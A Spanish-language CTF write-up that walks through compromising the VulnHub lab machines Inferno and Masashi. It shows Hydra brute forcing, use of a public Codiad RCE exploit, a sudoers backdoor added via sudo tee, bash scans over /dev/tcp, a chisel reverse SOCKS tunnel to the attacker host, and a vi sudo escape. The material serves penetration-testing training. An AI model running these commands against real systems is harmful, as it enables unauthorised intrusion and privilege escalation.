---
title: VH - Inferno -> Masashi ( Pivoting Lab )
published: true
categories: [Linux]
tags: [eCPPTv2, eWPT, Pivoting, Fácil, Media]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina [Inferno](https://www.vulnhub.com/entry/inferno-11,603/) de dificultad "Media" de la plataforma `VulnHub` para posteriormente hacer pivoting a la máquina [Masashi](https://www.vulnhub.com/entry/masashi-1,599/) de dificultad "Fácil" de la plataforma `VulnHub`

Técnicas Vistas (Inferno): 

- **Note: On this machine we have configured an internal network to Pivot to Empire: Masashi: 1**
- **Web Enumeration**
- **Basic Web Authentication Brute Force - Hydra**
- **Authenticated Codiad Exploitation - Remote Code Execution**
- **Information Leakage**
- **Abusing sudoers privilege in order to assign a new privilege in sudoers [Privilege Escalation]**
- **EXTRA: Creation of bash script to discover computers on the internal network**
- **EXTRA: Creation of a bash script to discover the open ports of the computers discovered in the internal network**
- **EXTRA: Remote Port Forwarding - Playing with Chisel (From Solstice)**
- **EXTRA: Socks5 connection with Chisel (Pivoting) (From Solstice)**
- **EXTRA: FoxyProxy + Socks5 Tunnel**
- **EXTRA: Fuzzing with gobuster through a Socks5 Proxy**

Técnicas Vistas (Masashi): 

- **Creating a customized dictionary with cewl**
- **SSH Brute Force - Hydra**
- **Abusing Sudoers Privilege (Privilege Escalation)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Inferno`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento (Inferno)

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.128	00:55:da:56:56:66	IEEE Registration Authority
192.168.1.129	c8:ff:77:4b:be:03	Dyson Limited
192.168.1.131	ac:67:84:98:f6:07	(Unknown)
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.141	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.149	00:0c:29:59:e0:75	VMware, Inc.
192.168.1.151	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
192.168.1.156	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.149`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 192.168.1.149
PING 192.168.1.149 (192.168.1.149) 56(84) bytes of data.
64 bytes from 192.168.1.149: icmp_seq=1 ttl=64 time=42.3 ms

--- 1192.168.1.149 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.149 -oG allPorts

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80 192.168.1.149 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:f4:d2:47:74:86:2f:b4:94:62:cd:31:f6:ef:51:a4 (RSA)
|   256 01:e9:02:a3:ff:ff:4a:7b:f2:20:1e:0b:44:9d:7f:f7 (ECDSA)
|_  256 a5:dc:a7:b1:20:33:f1:8d:c7:dd:f1:a3:59:5d:c2:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Dante s Inferno
MAC Address: 00:0C:29:59:E0:75 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web (Inferno)

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.149
http://192.168.1.149 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.149], Title[Dante s Inferno]
```

Accedemos al servicio web que nos presenta una imagen del Inferno de Dante. Ninguna funcionalidad aparente. Procedemos a aplicar fuzzing con el diccionario `directory-list-2.3-medium.txt` del repo `Seclists` de [Daniel Miessler](https://github.com/danielmiessler/SecLists) 

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.149/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.149/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000019947:   401        14 L     54 W       460 Ch      "inferno"      
```
Localizamos una posible ruta a la cual si accedemos nos presenta un panel de login. Al no tener credenciales porcedemos a usar `hydra` para aplicar fuerza bruta con el usuario `admin` y el diccionario `rockyou.txt`

```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.149 http-get /inferno -t 60
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-25 12:20:24
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking http-get://192.168.1.149:80/inferno
[80][http-get] host: 192.168.1.149   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-25 12:20:54
```

Accedemos con las credenciales obtenidas y se nos presenta otro panel de login. Reutilizando contraseña obtenida anteriormente logramos acceder alo que parece ser un IDE [Codiad](https://github.com/Codiad/Codiad/wiki)

<img src="/assets/VH/Inferno-Mashashi/codiad.png">

Buscamos vulnerabilidades asociadas con la herramienta `searchsploit`

```bash
❯ searchsploit codiad
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                                                                                  | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                                                                      | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                                                     | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                                                 | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                                                 | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                                                 | multiple/webapps/50474.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Probamos con el script `49705.py`, nos lo traemos a nustro directorio de trabajo, lo renombramos y ejecutamos según nos solicita. Tras ejecutarlo nos pide la ejecución de dos comandos, en dos consolas separadas ejecutamos los comandos que nos indica y ganamos acceso a la máquina víctima

<img src="/assets/VH/Inferno-Mashashi/accessinferno.png">

Listamos interfaces de red y vemos que la máquina Inerno está dentro de otro segmento en donde el rango de IPs es `10.10.0.X`

```bash
www-data@Inferno:/home$ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.149  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 00:0c:29:59:e0:75  txqueuelen 1000  (Ethernet)
        RX packets 219009  bytes 20646328 (19.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 173120  bytes 36411347 (34.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.0.139  netmask 255.255.255.0  broadcast 10.10.0.255
        ether 00:0c:29:59:e0:7f  txqueuelen 1000  (Ethernet)
        RX packets 19  bytes 4031 (3.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 2605 (2.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x2000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1638  bytes 128940 (125.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1638  bytes 128940 (125.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Pero primero debemos escalar privilegios en la máquina `Inferno`

### Movimiento Lateral (Inferno)

* * *

Examinamos los archivos que se encuentran en la carpeta personal del usuario `dante` y localizamos un archivo oculto que nos llama la atención `.download.docx`

```bash
.
.
./dante/Downloads/.download.dat
.
.
```

Listamos su contenido y observamos un código hexadecimal

```bash
cat ./Downloads/.download.dat; echo
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

Aplicamos decode y obtenemos una credencial en texto claro

```bash
cat ./Downloads/.download.dat | xxd -ps -r; echo
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

Ahora ya podemos conectarnos por SSH a la máquina víctima con el usuario `dante`

```bash
❯ ssh dante@192.168.1.149
The authenticity of host '192.168.1.149 (192.168.1.149)' can t be established.
ECDSA key fingerprint is SHA256:gevtPAVy2xIkGpAh9I8EkxaUTwwM192kXCg468jjhvo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.149' (ECDSA) to the list of known hosts.
dante@192.168.1.149 s password: 
Linux Inferno 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec  6 08:00:42 2020 from 192.168.1.124
dante@Inferno:~$ whoami
dante
```

La flag la encontramos en su directorio personal bajo el nombre `local.txt`

```bash
dante@Inferno:~$ cat local.txt 
77f6f3c544ec0811e2d1243e2e0d1835
```

### Escalada de Privilegios (Inferno)

* * *

Iniciamos enumeración del sistema listando grupos y privilegios de sudo

```bash
dante@Inferno:~$ id
uid=1000(dante) gid=1000(dante) groups=1000(dante),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```

Tenemos capacidad de ejecución del comando `tee` como su el cual nos permite añadir texto a un archivo. Se nos ocurre añadir al archivo `/etc/sudoers` la capacidad para el usario `dante` de ejecutar cualquier binario conmo sudo

```bash
dante@Inferno:~$ echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
dante ALL=(ALL) NOPASSWD:ALL
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
    (ALL) NOPASSWD: ALL
dante@Inferno:~$ sudo su
root@Inferno:/home/dante# whoami
root
```
La flag de root se encuentra bajo su directorio personal con el nombre de `proof.txt`

```bash
root@Inferno:/home/dante# cat /root/proof.txt 


 (        )  (          (        )     )   
 )\ )  ( /(  )\ )       )\ )  ( /(  ( /(   
(()/(  )\())(()/(  (   (()/(  )\()) )\())  
 /(_))((_)\  /(_)) )\   /(_))((_)\ ((_)\   
(_))   _((_)(_))_|((_) (_))   _((_)  ((_)  
|_ _| | \| || |_  | __|| _ \ | \| | / _ \  
 | |  | .` || __| | _| |   / | .` || (_) | 
|___| |_|\_||_|   |___||_|_\ |_|\_| \___/ 


Congrats!

You ve rooted Inferno!

77f6f3c544ec0811e2d1243e2e0d1835
```
Hemos completado la máquina **Inferno** de VulnHub!!

### Reconocimiento (Masashi)

* * *

Iniciamos el reconocimiento de la máquina `Masashi`. Necesitamos saber su IP y los puertos abiertos que tiene esta máquina. Para ello nos haremos un pequeño script en bash el cual nos ayudará con la tarea. Primero debemos saber la IP de la máquina víctima

```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVO" &
done; wait
```
```bash
dante@Inferno:/tmp$ ./hostDiscovery.sh 
[+] Host 10.10.0.1 - ACTIVO
[+] Host 10.10.0.139 - ACTIVO
[+] Host 10.10.0.138 - ACTIVO
```
Ya sabemos que la IP de la máquina `Masashi` es la 10.10.0.138. Ahora procedemos a enumerar los puertos abiertos mediante otro script en bash

```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.138/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
dante@Inferno:/tmp$ ./portDiscovery.sh 
[+] Port 22 - OPEN
[+] Port 80 - OPEN
```
A partir de este punto para trabajar más cómodamente vamos a crear un túnel por el cual nos vamos a poder acceder a la máquina `Masashi` desde nuestra equipo atacante a pesar de no tener conexión directa al no estar en el mismo segmento. Para esta tarea utilizaremos la herarmienta `chisel` la cual debemos subir a la máquina `Inferno` que es la que está en el mismo segmento que la `Masashi`. Los ejecutaremos de la siguiente forma

```bash
#Atacante
❯ ./chisel server --reverse -p 1234
2022/11/25 15:51:52 server: Reverse tunnelling enabled
2022/11/25 15:51:52 server: Fingerprint kEM4Zr5vaaKkRIeZHcew+ywR/TTw5G3WIFp9JynPrfU=
2022/11/25 15:51:52 server: Listening on http://0.0.0.0:1234
2022/11/25 15:52:40 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
#Inferno
dante@Inferno:/tmp$ ./chisel client 192.168.1.148:1234 R:socks
2022/11/25 09:52:40 client: Connecting to ws://192.168.1.148:1234
2022/11/25 09:52:40 client: Connected (Latency 699.578µs)
```
Añadimos al firefox una regla en el add-on Foxy proxy de la siguiente forma y ya podemos acceder por el navegador directamente a la máquina `Masashi` por el puerto 80

<img src="/assets/VH/Inferno-Mashashi/foxy.png">

<img src="/assets/VH/Inferno-Mashashi/apache.png">

### Reconocimiento Web (Masashi)

* * *

Procedemos a aplicar fuzzing de directorios y archivos

```bash
❯ gobuster dir -u http://10.10.0.138/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --proxy socks5://127.0.0.1:1080 -x html,php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.138/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/11/25 16:04:36 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10657]
/security.txt         (Status: 200) [Size: 54]   
/robots.txt           (Status: 200) [Size: 72] 
```

Accedemos a `robots.txt` y detectamos 3 rutas potenciales con información sensible

<img src="/assets/VH/Inferno-Mashashi/robots.png">

<img src="/assets/VH/Inferno-Mashashi/snmp.png">

<img src="/assets/VH/Inferno-Mashashi/ssh.png">

<img src="/assets/VH/Inferno-Mashashi/security.png">

De esta información extraemos un potencial usuario de la máquina `sv5`. Podríamos probar a realizar un ataque de fuerza bruta para extraer la contraseña del usuario en cuestión pero si tratamos de usar el típico `rockyou.txt` no conseguimos nada. Procedemos a realizar un diccionario personalizado con la herramienta `cewl` sobre la página principal de apache encontrada anteriormente. Tenemos que usar `proxychains` para poder llegar a través del túnel creado con chisel

```bash
❯ proxychains cewl.rb -w diccionario.txt http://10.10.0.138
ProxyChains-3.1 (http://proxychains.sf.net)
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.138:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.138:80-<><>-OK
❯ ls
 diccionario.txt
```

Con el diccionario personalizado procedemos a realizar un ataque de fuerza bruta por ssh

```bash
❯ proxychains hydra -l sv5 -P diccionario.txt ssh://10.10.0.138 -t 50 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-25 16:17:38
[DATA] max 50 tasks per 1 server, overall 50 tasks, 238 login tries (l:1/p:238), ~5 tries per task
[DATA] attacking ssh://10.10.0.138:22/
[22][ssh] host: 10.10.0.138   login: sv5   password: whoistheplug
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 32 final worker threads did not complete until end.
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-25 16:17:46
```

Conseguimos la credencial de `sv5` procedemos a conectarnos por SSH

```bash
❯ proxychains ssh sv5@10.10.0.138
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.138:22-<><>-OK
The authenticity of host '10.10.0.138 (10.10.0.138)' can t be established.
ECDSA key fingerprint is SHA256:PTghBsVWod0mGjVvof7umjMUnWtgEE6zvYPWZqEgcX4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.138' (ECDSA) to the list of known hosts.
sv5@10.10.0.138 s password: 
Linux masashi 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct 22 06:39:03 2020
sv5@masashi:~$
```

La flag la encontramos en el directorio personal de `sv5`

```bash
sv5@masashi:~$ cat /home/sv5/user.txt 
Hey buddy :)

Well done on that initial foothold ;) ;)

Key Takeaways:
* Do not always believe what the tool tells you, be the "Doubting Thomas" sometimes and look for
  yourself, e.g 1 disallowed entry in robots.txt wasn't really true was it? hehehehe
* It's not always about TCP all the time..... UDP is there for a reason and is just as important a
  protocol as is TCP......
* Lastly, there is always an alternative to everything i.e the ssh part.


***** Congrats Pwner ******
Now on to the privesc now ;)



##Creator: Donald Munengiwa
##Twitter: @lorde_zw
```
### Escalada de Privilegios (Masashi)

* * *

Iniciamos la enumeración listando grupos y privilegios de sudo del usuario `sv5`

```bash
sv5@masashi:~$ id
uid=1000(sv5) gid=1000(sv5) groups=1000(sv5),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
sv5@masashi:~$ sudo -l
Matching Defaults entries for sv5 on masashi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sv5 may run the following commands on masashi:
    (ALL) NOPASSWD: /usr/bin/vi /tmp/*
```
Nos percatamos que podemos ejecutar el editor `vi` como sudo. Con vim tenemos la opción de setear una variable y luego llamarla y como esto lo hacemos en el contexto de root por haber abierto la shell con sudo entonces ganamos acceso a una shell con privilegios de root. La flag la encontramos en el directorio de `/root`

<img src="/assets/VH/Inferno-Mashashi/setshell.png">
<img src="/assets/VH/Inferno-Mashashi/shell.png">

```bash
root@masashi:/home/sv5# whoami
root
root@masashi:/home/sv5# cat /root/root.txt 
Quite the pwner huh!!!! :)

Well i bet you had fun ;) ;)

Key Takeaways:
* Well, this time i ll leave it to you to tell me what you though about the overall experience you
  had from this challenge.
* Let us know on Twitter @lorde_zw or on linkedIn @Sv5


****** Congrats Pwner ******
If you ve gotten this far, please DM your Full name, Twitter Username, LinkedIn Username,
the flag [th33p1nplugg] and your country to the Twitter handle @lorde_zw ..... I will do a 
shoutout to all the pnwers who completed the challenge.....

Follow us for more fun Stuff..... Happy Hacktober Pwner (00=[][]=00)



##Creator: Donald Munengiwa
##Twitter: @lorde_zw
```

Hemos completado la máquina **Masashi** de VulnHub!! Happy Hacking!!